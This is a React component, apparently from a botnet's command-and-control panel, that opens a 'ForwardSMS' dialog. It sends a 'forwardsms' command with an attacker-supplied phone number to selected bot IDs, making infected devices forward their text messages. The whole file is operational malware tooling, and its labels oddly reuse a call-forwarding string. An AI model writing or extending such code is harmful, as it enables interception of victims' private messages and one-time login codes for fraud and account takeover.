import React from "react";
import {ModalWithSelectedBotsProps} from "../../../Model/Modal";
import {Form, Input, Modal} from "antd";
import {getBotsId} from "../../../Util/getBotIds";
import sendCommand from "../../../Requests/Commands/sendCommands";
import {inputRules} from "../../../Util/config";
import {useTranslation} from "react-i18next";

const ForwardSMS: React.FC<ModalWithSelectedBotsProps> = (props: ModalWithSelectedBotsProps) => {
    const [form] = Form.useForm();
    const {t} = useTranslation();

    const closeModal = () => {
        props.setVisible(false);
        form.resetFields();
    };
    const formSubmit = () => {
        sendCommand({
            command: "forwardsms",
            payload: form.getFieldsValue(["number"]),
            botIds: getBotsId(props.selectedBots),
        });

        closeModal();
    };

    return (
        <Modal
            title={t("FORWARD_CALL_COMMAND")}
            open={props.visible}
            onCancel={closeModal}
            onOk={() => form.submit()}
            okText={t("FORWARD_CALL_COMMAND")}
            cancelText={t("MODAL_BUTTON_CANCEL")}
            width={340}
            destroyOnClose
        >
            <Form form={form} layout="vertical" onFinish={formSubmit}>
                <Form.Item
                    label={t("NUMBER")}
                    name="number"
                    rules={inputRules}
                >
                    <Input type="text" placeholder={t("NUMBER")} />
                </Form.Item>
            </Form>
        </Modal>
    );
};

export default ForwardSMS;
